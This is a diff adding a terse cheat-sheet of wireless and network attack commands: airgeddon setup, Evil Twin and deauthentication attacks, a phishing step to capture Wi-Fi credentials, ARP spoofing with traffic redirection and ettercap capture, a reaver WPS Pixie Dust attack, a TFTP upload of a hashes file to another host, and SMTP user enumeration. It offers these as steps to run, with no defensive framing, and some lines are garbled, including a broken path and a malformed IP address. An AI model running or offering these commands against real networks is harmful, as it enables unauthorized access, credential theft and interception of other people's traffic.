@@ -1,0 +1,58 @@
+Airgedon
+
+apt-get install ccze
+git clone github.com/v1s1t0r1sh3r3/airgeddon.git
+cd airgeddon
+sudo bash ./airgeddon.sh
+sudo pip install tool
+
+Evil Twin attacks
+Deauth aireplay attack
+( iwconfig
+airmon-ng start wlan1
+airodump-ng mon0
+Aircrack-Ng
+Aireplay-ng
+Airdecap-Ng
+Airtun-Ng
+Airtun-ng
+Airolib-Ng
+Airbase-Ng)
+
+Set Up the Phishing Page
+Capture Network Credentials
+
+sudo ifconfig wlan0 down && sudo ifconfig wlan0 mode monitor && sudo ifconfig wlan0 up
+sudo nmap -sP 192.168.1.0/24
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1024
+sudo arpspoof -i [interface] -t [router ip, target ip]
+sudo ettercap -Tq -i wlan0 -w ~/Desktop/cap
+
+WPS Pixie Dust Attack 
+First, type into the terminal: apt-get update
+Then: 
+apt-get install build-essential
+apt-get install libpcap-dev
+apt-get install sqlite3
+apt-get install libsqlite3-dev
+apt-get install pixiewps
+
+git clone https://github.com/t6x/reaver-wps-fork-t6x
+cd reaver-wps-fork-t6x/
+cd src/
+./configure
+make
+make install
+
+airmon-ng start wlan0
+wash -i wlan0
+
+reaver -i {monitor interface} -b {BSSID of router} -c {router channel} -vvv -K 1 -f
+
+C:/tftp -i PUT 192.168.1. 119 hashes.txt
+
+smtp-user-enum
+smtp-user-enum -M VRFY -U <userlist> -t <target IP>
+smtp-user-enum -M VRFY -U /usr/sharefern-wifi-cracker/extras/wordlist -t 192.168.1.101
+/usr/share/fern-wifi-cracker/extras/wordlist
